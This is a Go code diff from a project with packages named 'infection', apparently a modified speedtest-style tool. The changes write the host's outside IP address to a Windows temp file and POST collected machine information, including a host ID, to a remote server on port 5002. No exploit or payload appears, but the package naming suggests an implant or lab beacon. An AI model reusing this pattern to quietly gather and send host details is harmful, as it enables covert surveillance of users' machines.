@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"github.com/parnurzeal/gorequest"
 	"gopkg.in/alecthomas/kingpin.v2"
+	"io/ioutil"
+
 	Server "infection/server"
 	User "infection/user"
 	"log"
@@ -64,12 +66,14 @@ type VersionDetail struct {
 	Hostid   string `json:"hostid"`
 }
 
-func MachineSend(addr string) {
+func MachineSend(addr string, finflag chan string) {
 	kingpin.Version("1.0.3")
 	kingpin.Parse()
 	setTimeout()
 	user := User.FetchUserInfo()
 	out := user.Show()
+	//write outsite ip
+	ioutil.WriteFile("C:\\Windows\\Temp\\ip.txt", []byte(out.OIp), 0644)
 	list := Server.FetchServerList(user.Lat, user.Lon)
 	if *showList {
 		list.Show()
@@ -100,7 +104,7 @@ func MachineSend(addr string) {
 	}
 	machineSendStatusResponse := MachineSendStatusResponse{}
 	resp, _, err := gorequest.New().
-		Post(addr).
+		Post("http://" + addr + ":5002/machine/machineInfo").
 		Send(MachineInfo).
 		EndStruct(&machineSendStatusResponse)
 	if err != nil {
@@ -111,6 +115,8 @@ func MachineSend(addr string) {
 	} else {
 		log.Println("Upload machineSend record Status Fail !")
 	}
+	finflag <- "file sent"
+	return
 }
 
 //hours
